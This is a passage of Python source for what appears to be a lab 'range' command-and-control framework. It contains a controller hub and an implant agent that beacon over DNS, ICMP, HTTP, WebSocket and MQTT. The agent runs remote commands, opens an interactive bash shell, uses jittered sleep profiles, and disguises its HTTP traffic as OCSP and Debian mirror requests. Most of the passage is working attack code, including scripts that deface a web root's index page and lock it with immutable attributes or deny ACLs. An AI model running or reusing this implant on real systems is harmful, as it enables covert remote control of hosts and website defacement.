        if length <= 0:
            break
    return out


def dec_rem(buf, index):
    value = 0
    mult = 1
    used = 0
    while used < 4:
        if index >= len(buf):
            return None, None
        byte = buf[index]
        index += 1
        used += 1
        value += (byte & 0x7F) * mult
        mult *= 128
        if not (byte & 0x80):
            return value, index
    return None, None


def mqtt_connect(client_id):
    payload = struct.pack("!H", len(client_id)) + client_id.encode("utf-8")
    variable = b"\x00\x04MQTT\x04\x02" + struct.pack("!H", 60) + payload
    return bytes([0x10]) + enc_rem(len(variable)) + variable


def mqtt_subscribe(packet_id, topic):
    raw = topic.encode("utf-8")
    body = struct.pack("!H", packet_id) + struct.pack("!H", len(raw)) + raw + b"\x00"
    return bytes([0x82]) + enc_rem(len(body)) + body


def mqtt_publish(topic, text):
    raw = topic.encode("utf-8")
    body = struct.pack("!H", len(raw)) + raw + text.encode("utf-8")
    return bytes([0x30]) + enc_rem(len(body)) + body


def mqtt_suback(packet_id, count):
    body = struct.pack("!H", packet_id) + (b"\x00" * count)
    return bytes([0x90]) + enc_rem(len(body)) + body


class PacketBuffer(object):
    def __init__(self, sock):
        self.sock = sock
        self.buf = b""

    def read_mqtt(self):
        while True:
            if len(self.buf) >= 2:
                rem, index = dec_rem(self.buf, 1)
                if rem is not None and len(self.buf) >= index + rem:
                    packet = self.buf[: index + rem]
                    self.buf = self.buf[index + rem :]
                    return packet
            chunk = self.sock.recv(4096)
            if not chunk:
                return None
            self.buf += chunk

    def readline(self):
        while b"\n" not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                return None
            self.buf += chunk
        line, self.buf = self.buf.split(b"\n", 1)
        return line


def mqtt_packet_type(packet):
    return (packet[0] >> 4) & 0x0F


def mqtt_parse_publish(packet):
    _rem, index = dec_rem(packet, 1)
    topic_len = struct.unpack("!H", packet[index : index + 2])[0]
    index += 2
    topic = packet[index : index + topic_len].decode("utf-8")
    index += topic_len
    qos = (packet[0] & 0x06) >> 1
    if qos:
        index += 2
    return topic, packet[index:].decode("utf-8")


def mqtt_parse_subscribe(packet):
    _rem, index = dec_rem(packet, 1)
    packet_id = struct.unpack("!H", packet[index : index + 2])[0]
    index += 2
    topics = []
    while index < len(packet):
        topic_len = struct.unpack("!H", packet[index : index + 2])[0]
        index += 2
        topics.append(packet[index : index + topic_len].decode("utf-8"))
        index += topic_len + 1
    return packet_id, topics


def recvall(sock, count):
    buf = b""
    while len(buf) < count:
        chunk = sock.recv(count - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def ws_accept_value(key):
    digest = hashlib.sha1((key + WS_GUID).encode("ascii")).digest()
    return base64.b64encode(digest).decode("ascii")


def ws_send(sock, text, masked):
    data = text.encode("utf-8")
    length = len(data)
    first = 0x81
    if length < 126:
        header = struct.pack("!BB", first, (0x80 if masked else 0) | length)
        extra = b""
    elif length < 65536:
        header = struct.pack("!BBH", first, (0x80 if masked else 0) | 126, length)
        extra = b""
    else:
        header = struct.pack("!BBQ", first, (0x80 if masked else 0) | 127, length)
        extra = b""
    if masked:
        mask = os.urandom(4)
        data = bytes(data[i] ^ mask[i % 4] for i in range(len(data)))
        sock.sendall(header + extra + mask + data)
    else:
        sock.sendall(header + data)


def ws_read_frame(sock):
    header = recvall(sock, 2)
    if not header:
        return None
    first, second = header[0], header[1]
    fin = (first & 0x80) != 0
    opcode = first & 0x0F
    masked = (second & 0x80) != 0
    length = second & 0x7F
    if length == 126:
        raw = recvall(sock, 2)
        if not raw:
            return None
        length = struct.unpack("!H", raw)[0]
    elif length == 127:
        raw = recvall(sock, 8)
        if not raw:
            return None
        length = struct.unpack("!Q", raw)[0]
    mask = recvall(sock, 4) if masked else None
    if masked and not mask:
        return None
    payload = recvall(sock, length) if length else b""
    if payload is None:
        return None
    if mask:
        payload = bytes(payload[i] ^ mask[i % 4] for i in range(len(payload)))
    return fin, opcode, payload


def ws_read_message(sock):
    pieces = []
    opcode = None
    while True:
        frame = ws_read_frame(sock)
        if frame is None:
            return None
        fin, op, payload = frame
        if op == 9:
            # pong, unmasked from the server side; agents never call this
            body = payload
            n = len(body)
            try:
                sock.sendall(struct.pack("!BB", 0x8A, n) + body)
            except Exception:
                return None
            continue
        if op == 8:
            return 8, b""
        if op in (0, 1, 2):
            if op != 0:
                opcode = op
            pieces.append(payload)
            if fin:
                return opcode or 1, b"".join(pieces)
        elif fin:
            return op, payload


def ws_handshake_client(sock, host, port):
    key = base64.b64encode(os.urandom(16)).decode("ascii")
    hostport = host if port in (80, 443) else "{0}:{1}".format(host, port)
    request = (
        "GET {path} HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "\r\n"
    ).format(path=WS_PATH, host=hostport, key=key)
    sock.sendall(request.encode("ascii"))
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise IOError("websocket handshake closed")
        data += chunk
        if len(data) > 8192:
            raise IOError("websocket handshake too large")
    head = data.split(b"\r\n\r\n", 1)[0].decode("ascii", "replace")
    if "101" not in head.split("\r\n", 1)[0]:
        raise IOError("websocket upgrade refused")


def ws_handshake_server(sock):
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(4096)
        if not chunk:
            return False
        data += chunk
        if len(data) > 16384:
            return False
    head = data.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
    lines = head.split("\r\n")
    if WS_PATH not in lines[0]:
        return False
    key = ""
    for line in lines[1:]:
        if line.lower().startswith("sec-websocket-key:"):
            key = line.split(":", 1)[1].strip()
    if not key:
        return False
    accept = ws_accept_value(key)
    response = (
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Accept: {0}\r\n"
        "\r\n"
    ).format(accept)
    sock.sendall(response.encode("ascii"))
    return True


def run_command(cmd, cwd, timeout):
    if os.name == "nt":
        return run_command_windows(cmd, cwd, timeout)
    return run_command_posix(cmd, cwd, timeout)


def run_command_posix(cmd, cwd, timeout):
    shell = "bash" if shutil.which("bash") else "sh"
    cwd_handle, cwd_path = tempfile.mkstemp(prefix="range-cwd-")
    os.close(cwd_handle)
    script = "cd -- {cwd} || exit 97\ntrap 'pwd > {mark}' EXIT\n{cmd}\n".format(
        cwd=shell_quote(cwd),
        mark=shell_quote(cwd_path),
        cmd=cmd,
    )
    try:
        proc = subprocess.Popen(
            [shell, "--noprofile", "--norc", "-s"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
        )
        try:
            out, _ = proc.communicate(script, timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
            out = (out or "") + "\n[timed out after {0}s]\n".format(timeout)
        new_cwd = cwd
        try:
            with open(cwd_path, "r") as handle:
                candidate = handle.read().strip()
            if candidate and os.path.isdir(candidate):
                new_cwd = candidate
        except IOError:
            pass
        text = out or ""
        if len(text) > MAX_OUT:
            text = text[:MAX_OUT] + "\n[truncated]\n"
        if not text.endswith("\n"):
            text += "\n"
        text += "[rc={0}]".format(proc.returncode)
        return text, new_cwd
    finally:
        try:
            os.remove(cwd_path)
        except OSError:
            pass


def run_command_windows(cmd, cwd, timeout):
    work = tempfile.mkdtemp(prefix="range-")
    script_path = os.path.join(work, "run.ps1")
    cwd_path = os.path.join(work, "cwd.txt")
    wrapper_path = os.path.join(work, "wrap.ps1")
    try:
        with open(script_path, "w") as handle:
            handle.write(cmd)
        wrapper = (
            "Set-Location -LiteralPath {cwd}\n"
            ". {script}\n"
            "$rc = if ($?) {{ 0 }} else {{ 1 }}\n"
            "Set-Content -LiteralPath {mark} -Value (Get-Location).Path\n"
            "exit $rc\n"
        ).format(
            cwd=ps_quote(cwd),
            script=ps_quote(script_path),
            mark=ps_quote(cwd_path),
        )
        with open(wrapper_path, "w") as handle:
            handle.write(wrapper)
        proc = subprocess.Popen(
            [
                "powershell.exe",
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-File",
                wrapper_path,
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
        )
        try:
            out, _ = proc.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
            out = (out or "") + "\n[timed out after {0}s]\n".format(timeout)
        new_cwd = cwd
        try:
            with open(cwd_path, "r") as handle:
                candidate = handle.read().strip()
            if candidate and os.path.isdir(candidate):
                new_cwd = candidate
        except IOError:
            pass
        text = out or ""
        if len(text) > MAX_OUT:
            text = text[:MAX_OUT] + "\n[truncated]\n"
        if not text.endswith("\n"):
            text += "\n"
        text += "[rc={0}]".format(proc.returncode)
        return text, new_cwd
    finally:
        shutil.rmtree(work, ignore_errors=True)


PAGE = """<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Defaced</title></head>
<body style="font-family: sans-serif; text-align: center; padding: 12vh 1rem;">
<h1>Defaced</h1>
<p>This page was changed during an authorized lab exercise.</p>
<p>Put the site back. If the file will not save, the reason is on the host, not in the editor.</p>
</body>
</html>
"""

CLEAN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Index</title></head>
<body><h1>Site index</h1><p>Restored by the lab operator. No pre-change copy was kept.</p></body>
</html>
"""


def linux_script(kind, webroot, page_html=None, image_name=None, image_bytes=None):
    wr = shell_quote(webroot or "")
    page_body = page_html if page_html else PAGE
    marker, page_body = heredoc(page_body, "RANGEHTML")
    image_name_safe = safe_filename(image_name) if image_name else ""
    image_write = ""
    if image_bytes and image_name_safe:
        image_write = (
            "if [ -n \"$dest\" ] && [ -f \"$r/{name}\" ]; then cp -a \"$r/{name}\" \"$dest/{name}.orig\"; fi\n"
            "base64 -d > \"$r/{name}\" << 'RANGEIMG'\n{b64}\nRANGEIMG\n"
            "echo IMAGE=$r/{name}\n"
            "if command -v chattr >/dev/null 2>&1; then chattr +i \"$r/{name}\" 2>/dev/null || true; fi\n"
        ).format(b64=b64_lines(image_bytes), name=image_name_safe)
    common = (
        "wr={wr}\n"
        "if [ -n \"$wr\" ]; then\n"
        "  mkdir -p \"$wr\" || {{ echo BAD_WEBROOT; exit 1; }}\n"
        "  r=\"$wr\"\n"
        "else\n"
        "  r=\"\"\n"
        "  for d in /var/www/html /usr/share/nginx/html /var/www /srv/www/htdocs; do\n"
        "    if [ -d \"$d\" ]; then r=\"$d\"; break; fi\n"
        "  done\n"
        "fi\n"
        "if [ -z \"$r\" ]; then echo NO_WEBROOT; exit 1; fi\n"
        "f=\"$r/index.html\"\n"
        "echo WEBROOT=$r\n"
    ).format(wr=wr)
    if kind == "look":
        return common + (
            "if command -v lsattr >/dev/null 2>&1; then lsattr \"$f\" 2>/dev/null || true; fi\n"
            "stat -c 'MODE=%a OWNER=%U GROUP=%G MTIME=%y' \"$f\" 2>/dev/null || true\n"
            "echo '---- head ----'\n"
            "head -n 40 \"$f\" 2>/dev/null || echo MISSING\n"
            "echo DONE\n"
        )
    if kind == "undo":
        return common + (
            "if command -v chattr >/dev/null 2>&1; then chattr -i \"$f\" 2>/dev/null || true; fi\n"
            "restored=0\n"
            "for b in \"$HOME/.range-lab/index.html.orig\" \"/tmp/range-lab-$USER/index.html.orig\"; do\n"
            "  if [ -f \"$b\" ]; then cp -a \"$b\" \"$f\"; echo RESTORED_FROM=$b; restored=1; break; fi\n"
            "done\n"
            "if [ \"$restored\" != 1 ]; then\n"
            "  cat > \"$f\" << 'EOF'\n" + CLEAN_PAGE + "EOF\n"
            "  echo RESTORED_FROM=none\n"
            "fi\n"
            + (
                "img=\"$r/{name}\"\n"
                "if [ -n \"{name}\" ] && [ -e \"$img\" ]; then\n"
                "  if command -v chattr >/dev/null 2>&1; then chattr -i \"$img\" 2>/dev/null || true; fi\n"
                "  if [ -f \"$HOME/.range-lab/{name}.orig\" ]; then cp -a \"$HOME/.range-lab/{name}.orig\" \"$img\"; echo IMAGE_RESTORED=1;\n"
                "  elif [ -f \"/tmp/range-lab-$USER/{name}.orig\" ]; then cp -a \"/tmp/range-lab-$USER/{name}.orig\" \"$img\"; echo IMAGE_RESTORED=1;\n"
                "  else rm -f \"$img\"; echo IMAGE_REMOVED=1; fi\n"
                "fi\n"
            ).format(name=image_name_safe)
            + "if command -v lsattr >/dev/null 2>&1; then lsattr \"$f\" 2>/dev/null || true; fi\n"
            "echo DONE\n"
        )
    backup = "1" if kind == "deface" else "0"
    script = common + (
        "if [ \"{backup}\" = 1 ] && [ -f \"$f\" ]; then\n"
        "  dest=\"$HOME/.range-lab\"\n"
        "  mkdir -p \"$dest\" 2>/dev/null || dest=\"/tmp/range-lab-$USER\"\n"
        "  mkdir -p \"$dest\"\n"
        "  cp -a \"$f\" \"$dest/index.html.orig\"\n"
        "  echo BACKUP=$dest/index.html.orig\n"
        "else\n"
        "  echo BACKUP=none\n"
        "  dest=\"\"\n"
        "fi\n"
        "if command -v chattr >/dev/null 2>&1; then chattr -i \"$f\" 2>/dev/null || true; fi\n"
    ).format(backup=backup)
    script += "cat > \"$f\" << '{0}'\n".format(marker) + page_body + "\n{0}\n".format(marker)
    script += image_write
    script += (
        "if command -v chattr >/dev/null 2>&1; then\n"
        "  if chattr +i \"$f\" 2>/dev/null; then echo IMMUTABLE=set; else echo IMMUTABLE=failed; fi\n"
        "else\n"
        "  echo IMMUTABLE=chattr-missing\n"
        "fi\n"
        "if command -v lsattr >/dev/null 2>&1; then lsattr \"$f\" 2>/dev/null || true; fi\n"
        "if command -v sha256sum >/dev/null 2>&1; then sha256sum \"$f\"; fi\n"
        "stat -c 'MODE=%a OWNER=%U GROUP=%G MTIME=%y' \"$f\" 2>/dev/null || true\n"
        "echo DONE\n"
    )
    return script


def windows_script(kind, webroot, page_html=None, image_name=None, image_bytes=None):
    wr = ps_quote(webroot or "")
    find_root = (
        "$explicit = {wr}\n"
        "if ($explicit) {{\n"
        "  if (-not (Test-Path -LiteralPath $explicit)) {{\n"
        "    New-Item -ItemType Directory -Path $explicit -Force | Out-Null\n"
        "  }}\n"
        "  $root = $explicit\n"
        "}} else {{\n"
        "  $root = $null\n"
        "  foreach ($d in @('C:\\inetpub\\wwwroot','C:\\www')) {{\n"
        "    if (Test-Path -LiteralPath $d) {{ $root = $d; break }}\n"
        "  }}\n"
        "}}\n"
        "if (-not $root) {{ Write-Output 'NO_WEBROOT'; exit 1 }}\n"
        "$target = Join-Path $root 'index.html'\n"
        "Write-Output \"WEBROOT=$root\"\n"
    ).format(wr=wr)
    if kind == "look":
        return find_root + (
            "if (Test-Path -LiteralPath $target) {\n"
            "  attrib $target\n"
            "  icacls $target\n"
            "  Get-Content -LiteralPath $target -TotalCount 40\n"
            "} else { Write-Output 'MISSING' }\n"
            "Write-Output 'DONE'\n"
        )
    if kind == "undo":
        return find_root + (
            "if (Test-Path -LiteralPath $target) { attrib -R $target | Out-Null }\n"
            "icacls $target /remove:d '*S-1-1-0' 2>$null | Out-Null\n"
            "$bak = Join-Path $env:ProgramData 'RangeLab\\index.html.orig'\n"
            "if (Test-Path -LiteralPath $bak) {\n"
            "  Copy-Item -LiteralPath $bak -Destination $target -Force\n"
            "  Write-Output \"RESTORED_FROM=$bak\"\n"
            "} else {\n"
            "  Set-Content -LiteralPath $target -Value @'\n"
            + CLEAN_PAGE
            + "'@ -Encoding ASCII\n"
            "  Write-Output 'RESTORED_FROM=none'\n"
            "}\n"
            "Write-Output 'DONE'\n"
        )
    do_backup = "$true" if kind == "deface" else "$false"
    page = page_html if page_html else PAGE
    if "'@" in page:
        html_set = (
            "$html = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"
            + b64_lines(page.encode("utf-8")).replace("\n", "")
            + "'))\n"
        )
    else:
        html_set = "$html = @'\n" + page + "'@\n"
    image_set = ""
    if image_bytes and image_name:
        image_set = (
            "$imgPath = Join-Path $root '{name}'\n"
            "$imgBytes = [Convert]::FromBase64String('{b64}')\n"
            "[IO.File]::WriteAllBytes($imgPath, $imgBytes)\n"
            "attrib +R $imgPath\n"
            "Write-Output \"IMAGE=$imgPath\"\n"
        ).format(name=safe_filename(image_name).replace("'", "''"), b64=b64_lines(image_bytes).replace("\n", ""))
    return find_root + (
        "$doBackup = {flag}\n"
        "if ($doBackup -and (Test-Path -LiteralPath $target)) {{\n"
        "  $dest = Join-Path $env:ProgramData 'RangeLab'\n"
        "  New-Item -ItemType Directory -Path $dest -Force | Out-Null\n"
        "  Copy-Item -LiteralPath $target -Destination (Join-Path $dest 'index.html.orig') -Force\n"
        "  Write-Output \"BACKUP=$dest\\index.html.orig\"\n"
        "}} else {{ Write-Output 'BACKUP=none' }}\n"
        "if (Test-Path -LiteralPath $target) {{ attrib -R $target | Out-Null }}\n"
        "icacls $target /remove:d '*S-1-1-0' 2>$null | Out-Null\n"
    ).format(flag=do_backup) + html_set + (
        "Set-Content -LiteralPath $target -Value $html -Encoding ASCII\n"
        "attrib +R $target\n"
    ) + image_set + (
        "$deny = icacls $target /deny '*S-1-1-0:(W,D)' 2>&1 | Out-String\n"
        "Write-Output 'LOCK=read-only plus an Everyone write deny if icacls succeeded'\n"
        "Write-Output $deny\n"
        "attrib $target\n"
        "Write-Output 'DONE'\n"
    )


def too_big_for(channel, sid, zone, direction):
    if channel == "dns" and direction == "down":
        return lambda frame: len(to_hex(frame)) > 360

    if channel == "dns":
        return lambda frame: len(dns_uplink_name(frame, sid, zone)) > 240

    if channel == "icmp":
        return lambda frame: len(b64e(frame)) > 1100

    if channel == "http":
        return lambda frame: len(to_hex(frame)) > 1500

    return lambda frame: len(b64e(frame)) > 6000


class Hub(object):
    def __init__(self, token, ports, zone):
        self.token = token
        self.ports = ports
        self.zone = zone
        self.lock = threading.Lock()
        self.sessions = {}
        self.waiters = {}
        self.seq = 20
        self.term_parts = {}
        self.term_live = {}

    def note_seen(self, sid, channel):
        sid = sanitize_id(sid)
        now = time.time()
        with self.lock:
            session = self.sessions.get(sid)
            if session is None:
                self.sessions[sid] = {
                    "channel": channel,
                    "meta": "",
                    "last": now,
                    "send": None,
                    "queue": [],
                    "profile": "live",
                }
            else:
                session["last"] = now
                if channel:
                    session["channel"] = channel
        return sid

    def touch(self, sid, channel, meta, send):
        sid = sanitize_id(sid)
        pending = []
        with self.lock:
            session = self.sessions.get(sid)
            if session is None:
                session = {
                    "channel": channel,
                    "meta": "",
                    "last": time.time(),
                    "send": None,
                    "queue": [],
                    "profile": "live",
                }
                self.sessions[sid] = session
            session["last"] = time.time()
            session["channel"] = channel or session["channel"]
            if meta:
                session["meta"] = meta
                bits = meta.split("|")
                if len(bits) >= 6 and bits[5] in ("continuous", "off", "live", "hunt"):
                    session["profile"] = bits[5]
            if send is not None:
                session["send"] = send
                pending = list(session["queue"])
                session["queue"] = []
        for item in pending:
            try:
                send(item)
            except Exception as exc:
                log("send to {0} failed: {1}".format(sid, exc))
                with self.lock:
                    session = self.sessions.get(sid)
                    if session is not None:
                        session["queue"].append(item)
                        if session.get("send") == send:
                            session["send"] = None
                break
        return sid

    def detach(self, sid, send):
        with self.lock:
            session = self.sessions.get(sid)
            if session and session.get("send") == send:
                session["send"] = None

    def remember_profile(self, sid, profile):
        with self.lock:
            session = self.sessions.get(sid)
            if session is not None and profile in ("continuous", "off", "live", "hunt"):
                session["profile"] = profile

    def enqueue(self, sid, json_text):
        sid = sanitize_id(sid)
        send = None
        with self.lock:
            session = self.sessions.get(sid)
            if session is None:
                session = {
                    "channel": "?",
                    "meta": "",
                    "last": 0,
                    "send": None,
                    "queue": [],
                    "profile": "live",
                }
                self.sessions[sid] = session
            if session.get("send") is not None:
                send = session["send"]
            else:
                session["queue"].append(json_text)
                return
        try:
            send(json_text)
        except Exception as exc:
            log("send to {0} failed: {1}".format(sid, exc))
            with self.lock:
                session = self.sessions.get(sid)
                if session is not None:
                    session["queue"].append(json_text)
                    if session.get("send") == send:
                        session["send"] = None

    def pull(self, sid, channel):
        sid = self.note_seen(sid, channel)
        with self.lock:
            session = self.sessions.get(sid)
            if not session or not session["queue"]:
                return None
            return session["queue"].pop(0)

    def ingest(self, obj):
        if obj["o"] == "h":
            return
        if obj["o"] == "z":
            with self.lock:
                live = self.term_live.setdefault(obj["i"], {"chunks": [], "closed": None})
                live["closed"] = obj["d"] or "closed"
            return
        if obj["o"] == "y":
            key = (obj["i"], obj["n"])
            done = None
            with self.lock:
                parts = self.term_parts.setdefault(key, {})
                parts[obj["p"]] = obj["d"]
                if len(parts) >= obj["c"] and all(i in parts for i in range(obj["c"])):
                    done = "".join(parts[i] for i in range(obj["c"]))
                    self.term_parts.pop(key, None)
            if done is None:
                return
            try:
                raw = base64.b64decode(done) if done else b""
            except Exception:
                raw = b""
            with self.lock:
                live = self.term_live.setdefault(obj["i"], {"chunks": [], "closed": None})
                if raw:
                    live["chunks"].append(raw)
            return
        if obj["o"] != "r":
            return
        key = (obj["i"], obj["n"])
        event = None
        with self.lock:
            waiter = self.waiters.get(key)
            if waiter is None:
                return
            waiter["parts"][obj["p"]] = obj["d"]
            if len(waiter["parts"]) >= obj["c"] and all(
                i in waiter["parts"] for i in range(obj["c"])
            ):
                waiter["out"] = "".join(waiter["parts"][i] for i in range(obj["c"]))
                event = waiter["event"]
        if event is not None:
            event.set()

    def channel_of(self, sid):
        with self.lock:
            session = self.sessions.get(sid)
            if not session:
                return "dns"
            return session.get("channel") or "dns"

    def profile_of(self, sid):
        with self.lock:
            session = self.sessions.get(sid)
            if not session:
                return "live"
            return session.get("profile") or "live"

    def exec_cmd(self, sid, command, timeout):
        sid = sanitize_id(sid)
        with self.lock:
            self.seq += 1
            seq = self.seq
            event = threading.Event()
            self.waiters[(sid, seq)] = {"event": event, "parts": {}, "out": None}
            channel = "dns"
            session = self.sessions.get(sid)
            if session:
                channel = session.get("channel") or "dns"
        frames = split_data(
            "x",
            command,
            sid,
            seq,
            self.token,
            too_big_for(channel, sid, self.zone, "down"),
        )
        for frame in frames:
            self.enqueue(sid, frame)
        if not event.wait(timeout):
            with self.lock:
                self.waiters.pop((sid, seq), None)
            return "[no result before timeout — agent offline or profile is slow]\n"
        with self.lock:
            waiter = self.waiters.pop((sid, seq), {})
        return waiter.get("out") or ""

    def term_send(self, sid, payload):
        sid = sanitize_id(sid)
        with self.lock:
            self.seq += 1
            seq = self.seq
            channel = "tcp"
            session = self.sessions.get(sid)
            if session:
                channel = session.get("channel") or "tcp"
            self.term_live.setdefault(sid, {"chunks": [], "closed": None})
        frames = split_data("t", payload, sid, seq, self.token, too_big_for(channel, sid, self.zone, "down"))
        for frame in frames:
            self.enqueue(sid, frame)

    def term_take(self, sid):
        with self.lock:
            live = self.term_live.get(sid)
            if not live:
                return b"", None
            chunks = live["chunks"]
            live["chunks"] = []
            return b"".join(chunks), live.get("closed")

    def set_profile(self, sid, profile):
        sid = sanitize_id(sid)
        with self.lock:
            self.seq += 1
            seq = self.seq
            channel = "tcp"
            session = self.sessions.get(sid)
            if session:
                channel = session.get("channel") or "tcp"
                session["profile"] = profile
        frame = seal_obj("f", profile, sid, seq, 0, 1, self.token)
        if too_big_for(channel, sid, self.zone, "down")(frame):
            return False
        self.enqueue(sid, frame)
        return True

    def is_online(self, session, now):
        age = now - (session.get("last") or 0)
        channel = session.get("channel")
        if channel in ("tcp", "ws", "mqtt"):
            return session.get("send") is not None
        profile = session.get("profile")
        if profile == "off":
            limit = 50 * 60
        elif profile == "hunt":
            limit = 100
        else:
            limit = 20
        return age < limit

    def online_ids(self):
        now = time.time()
        with self.lock:
            items = list(self.sessions.items())
        return [sid for sid, session in items if self.is_online(session, now)]

    def format_sessions(self):
        now = time.time()
        with self.lock:
            items = list(self.sessions.items())
        if not items:
            return "no agents yet"
        rows = ["id          channel  state  profile    os       user     age"]
        for sid, session in sorted(items):
            age = int(now - session["last"]) if session.get("last") else -1
            bits = (session.get("meta") or "").split("|")
            osname = bits[1] if len(bits) > 1 else "?"
            user = bits[2] if len(bits) > 2 else "?"
            state = "up" if self.is_online(session, now) else "stale"
            rows.append(
                "{0:<11} {1:<8} {2:<6} {3:<10} {4:<8} {5:<8} {6}s".format(
                    sid[:11],
                    (session.get("channel") or "?")[:8],
                    state,
                    (session.get("profile") or "?")[:10],
                    osname[:8],
                    user[:8],
                    age,
                )
            )
        return "\n".join(rows)

    def os_of(self, sid):
        with self.lock:
            session = self.sessions.get(sid)
            meta = session.get("meta") if session else ""
        bits = (meta or "").split("|")
        if len(bits) > 1:
            return bits[1]
        return "linux"


class Agent(object):
    def __init__(self, sid, token, channel, profile, zone, timeout):
        self.sid = sanitize_id(sid)
        self.token = token
        self.channel = channel
        self.profile = profile if profile in ("continuous", "off", "live", "hunt") else "continuous"
        self.zone = zone
        self.timeout = timeout
        self.cwd = os.getcwd()
        self.box = Reassembler()
        self.out_seq = 1
        self.up_limit = too_big_for(channel, self.sid, zone, "up")
        self.tty = None

    def hello_meta(self):
        try:
            user = getpass.getuser()
        except Exception:
            user = "?"
        return "{0}|{1}|{2}|{3}|{4}|{5}".format(
            self.sid,
            platform.system().lower(),
            user,
            self.channel,
            platform.python_version(),
            self.profile,
        )

    def hello_frames(self):
        return split_data("h", self.hello_meta(), self.sid, 0, self.token, self.up_limit)

    def tty_frames(self, op, payload):
        self.out_seq += 1
        return split_data(op, payload, self.sid, self.out_seq, self.token, self.up_limit)

    def ensure_tty(self, rows, cols):
        if self.tty:
            if self.tty["proc"].poll() is None:
                return True
            self.tty_close()
        if os.name == "nt":
            return False
        import fcntl
        import pty
        import termios

        master, slave = pty.openpty()
        try:
            rows = max(10, min(int(rows), 80))
            cols = max(40, min(int(cols), 200))
            fcntl.ioctl(slave, termios.TIOCSWINSZ, struct.pack("HHHH", rows, cols, 0, 0))
        except Exception:
            pass
        proc = subprocess.Popen(
            ["/bin/bash", "--noprofile", "--norc", "-i"],
            stdin=slave,
            stdout=slave,
            stderr=slave,
            cwd=self.cwd or None,
            preexec_fn=os.setsid,
        )
        os.close(slave)
        flags = fcntl.fcntl(master, fcntl.F_GETFL)
        fcntl.fcntl(master, fcntl.F_SETFL, flags | os.O_NONBLOCK)
        self.tty = {"fd": master, "proc": proc}
        return True

    def tty_write(self, data):
        if not self.tty:
            return
        try:
            os.write(self.tty["fd"], data)
        except OSError:
            pass

    def tty_read(self, wait):
        if not self.tty:
            return b""
        fd = self.tty["fd"]
        chunks = []
        total = 0
        deadline = time.time() + wait
        while total < 24000 and time.time() < deadline:
            ready, _, _ = select.select([fd], [], [], max(0.0, deadline - time.time()))
            if not ready:
                break
            try:
                chunk = os.read(fd, 4096)
            except OSError:
                break
            if not chunk:
                break
            chunks.append(chunk)
            total += len(chunk)
            deadline = time.time() + 0.05
        return b"".join(chunks)

    def tty_close(self):
        if not self.tty:
            return
        proc = self.tty["proc"]
        fd = self.tty["fd"]
        self.tty = None
        try:
            proc.terminate()
        except OSError:
            pass
        try:
            os.close(fd)
        except OSError:
            pass

    def tty_poll_frames(self):
        if not self.tty:
            return []
        if self.tty["proc"].poll() is not None:
            self.tty_close()
            return self.tty_frames("z", "closed")
        data = self.tty_read(0.05)
        if not data:
            return []
        return self.tty_frames("y", b64e(data))

    def accept_term(self, payload):
        if payload == "0":
            self.tty_close()
            return self.tty_frames("z", "closed")
        if payload.startswith("1:"):
            bits = payload.split(":")
            rows = bits[1] if len(bits) > 1 else "24"
            cols = bits[2] if len(bits) > 2 else "80"
            if not self.ensure_tty(rows, cols):
                return self.tty_frames("z", "no-tty")
            data = self.tty_read(0.4)
            if not data:
                return []
            return self.tty_frames("y", b64e(data))
        if payload.startswith("2:"):
            if not self.tty and not self.ensure_tty(24, 80):
                return self.tty_frames("z", "no-tty")
            try:
                raw = base64.b64decode(payload[2:])
            except Exception:
                raw = b""
            if raw:
                self.tty_write(raw)
            data = self.tty_read(0.2)
            if not data:
                return []
            return self.tty_frames("y", b64e(data))
        return []

    def accept_json(self, text):
        obj = open_frame(text, self.token)
        if not obj or obj["i"] != self.sid:
            return []
        if obj["o"] == "n":
            return self.tty_poll_frames()
        if obj["o"] == "t":
            command = self.box.push(obj)
            if command is None:
                return []
            return self.accept_term(command)
        if obj["o"] == "f":
            if obj["d"] in ("continuous", "off", "live", "hunt"):
                self.profile = obj["d"]
            self.out_seq += 1
            return split_data(
                "r",
                "profile={0}\n[rc=0]".format(self.profile),
                self.sid,
                obj["n"],
                self.token,
                self.up_limit,
            )
        if obj["o"] != "x":
            return []
        command = self.box.push(obj)
        if command is None:
            return []
        output, self.cwd = run_command(command, self.cwd, self.timeout)
        return split_data("r", output, self.sid, obj["n"], self.token, self.up_limit)

    def idle_sleep(self):
        if self.profile == "off":
            time.sleep(random.uniform(1500.0, 2100.0))
        elif self.profile == "hunt":
            time.sleep(random.uniform(20.0, 45.0))
        else:
            time.sleep(1.0)


def http_request(url, headers):
    try:
        from urllib.request import Request, urlopen
    except ImportError:
        from urllib2 import Request, urlopen
    req = Request(url, headers=headers)
    try:
        resp = urlopen(req, timeout=8)
        try:
            return resp.read().decode("utf-8", "replace")
        finally:
            resp.close()
    except Exception:
        return None


def agent_http_loop(agent, host, port):
    windows = os.name == "nt"
    scheme_host = host
    base = "http://{0}:{1}".format(scheme_host, port)
    ua = WINDOWS_UA if windows else LINUX_UA
    outbox = []
    outbox.extend(agent.hello_frames())
    while not STOP.is_set():
        if outbox:
            frame = outbox.pop(0)
            hexed = to_hex(frame)
            if windows:
                url = base + "/ocsp/nonce/" + hexed
            else:
                url = base + "/debian/dists/bookworm/by-hash/SHA256/" + hexed
